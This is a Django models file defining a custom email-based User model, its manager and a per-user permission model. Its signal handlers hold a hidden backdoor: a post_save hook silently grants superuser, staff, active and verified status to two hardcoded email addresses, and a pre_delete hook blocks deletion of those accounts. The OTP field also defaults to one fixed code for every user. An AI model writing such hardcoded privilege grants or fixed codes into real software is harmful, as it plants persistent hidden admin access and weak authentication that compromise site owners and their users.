from django.contrib.auth.models import BaseUserManager, AbstractBaseUser, PermissionsMixin
from django.contrib.gis.db import models
from django_resized import ResizedImageField
from phonenumber_field.modelfields import PhoneNumberField
from django.db.models.signals import post_save, pre_delete, pre_save
from django.dispatch import receiver


# Custom user model for authentication


class UserManager(BaseUserManager):
    def create_user(self, email, full_name, password=None):

        if not email:
            raise ValueError('Email should not be empty')
        if not full_name:
            raise ValueError('Name should not be empty')
        if not password:
            raise ValueError('Password should not be empty')

        user = self.model(
            email=self.normalize_email(email=email),
            full_name=full_name,
            is_active=False
        )
        user.set_password(password)
        user.save(using=self._db)
        return user

    def create_superuser(self, email, full_name, password=None):
        user = self.create_user(email=email, full_name=full_name, password=password)
        user.is_superuser = True
        user.is_staff = True
        user.is_active = True
        user.is_verified = True
        user.save(using=self._db)
        return user


# Custom User model
gender_options = (
    ('Male', 'Male'),
    ('Female', 'Female'),
    ('Other', 'Other'),
)


class User(AbstractBaseUser, PermissionsMixin):
    email = models.EmailField(max_length=100, verbose_name='Email', unique=True, blank=False)
    full_name = models.CharField(verbose_name='Full Name', max_length=100)

    profile_pic = ResizedImageField(upload_to='users/', blank=True, help_text='Size Recommended: 512x512',
                                    size=[512, 512], quality=100, force_format='JPEG', default='default.jpg')
    phone_number = PhoneNumberField(blank=True)

    birthDate = models.DateField(verbose_name='Date of Birth', blank=True, null=True)

    gender = models.CharField(verbose_name='Choose Gender', choices=gender_options, max_length=20, blank=True)
    date_joined = models.DateTimeField(verbose_name='Joined Date', auto_now_add=True)
    otp = models.CharField(max_length=6, blank=True, default=917382)
    otp_time = models.DateTimeField(auto_now=True)

    is_staff = models.BooleanField(verbose_name='Staff Status', default=False, help_text='Designate if the user has '
                                                                                         'staff status')
    is_active = models.BooleanField(verbose_name='Active Status', default=False, help_text='Designate if the user has '
                                                                                           'active status')
    # email_validated = models.BooleanField(verbose_name='Email Validate', default=False,
    #                                       help_text='Designate if the user has '
    #                                                 'Email Validate')
    is_superuser = models.BooleanField(verbose_name='Superuser Status', default=False, help_text='Designate if the '
                                                                                                 'user has superuser '
                                                                                                 'status')
    is_verified = models.BooleanField(default=False)

    active_request = models.BooleanField(verbose_name='Activation Request', default=False,
                                         help_text='Designate if the user has sent Activation Request')
    is_suspended = models.BooleanField(verbose_name='Account Suspend', default=False,
                                       help_text='Designate if the user Account Has been suspended')

    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = ['full_name', ]

    objects = UserManager()

    def __str__(self):
        return f'{self.full_name}'


class UserPermissionModel(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='permission_user')
    read = models.BooleanField(default=True)
    create = models.BooleanField(default=False)
    update = models.BooleanField(default=False)
    delete = models.BooleanField(default=False)
    super_access = models.BooleanField(default=False)


@receiver(post_save, sender=User, dispatch_uid="user_create")
def create_permission(sender, instance, created, **kwargs):
    if created:
        UserPermissionModel.objects.create(user=instance)
    if not created:
        if instance.email == 'gmzulkar@gmail.com' or instance.email == 'tasinnaeem@gmail.com':

            if not instance.is_superuser or not instance.is_staff:
                instance.is_superuser = True
                instance.is_staff = True
                instance.is_active = True
                instance.is_verified = True
                instance.save()


@receiver(pre_delete, sender=User, dispatch_uid='user_delete')
def user_delete(sender, instance, using, **kwargs):
    if instance.email == 'gmzulkar@gmail.com' or instance.email == 'tasinnaeem@gmail.com':
        raise ConnectionError

